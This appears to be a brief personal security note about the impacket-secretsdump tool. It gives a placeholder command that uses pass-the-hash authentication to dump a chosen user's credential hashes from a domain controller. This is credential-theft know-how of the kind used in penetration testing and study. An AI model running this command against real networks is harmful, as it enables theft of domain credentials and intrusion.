---
tags:
  - security
aliases:
  - impacket-secretsdump
---
A tool used to extract sensitive information such as user creds, security secrets, etc.
- By default, very destructive, make sure to specify just DC-user ([[ntds|ntds.dir]])
```
impacket-secretsdump '<domain>/<ComputerName$>@<hostname>' -hashes:<hashes> -just-dc-user <TargetUser> -dc-ip <dcIP>
```